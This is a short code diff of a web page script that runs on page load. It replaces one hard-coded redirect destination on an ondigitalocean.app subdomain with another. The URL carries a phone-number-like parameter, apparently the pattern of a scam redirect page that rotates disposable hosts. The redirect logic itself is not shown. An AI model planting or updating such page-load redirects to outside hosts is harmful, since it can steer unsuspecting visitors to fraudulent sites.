@@ -6,7 +6,7 @@
 <script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://lobster-app-q2x7g.ondigitalocean.app/?bcda=(03)-4520-9115";
+            const redirectUrl = "https://whale-app-phymv.ondigitalocean.app/?bcda=(03)-4520-9115";
 
             const style = document.createElement("style");
             style.textContent = `
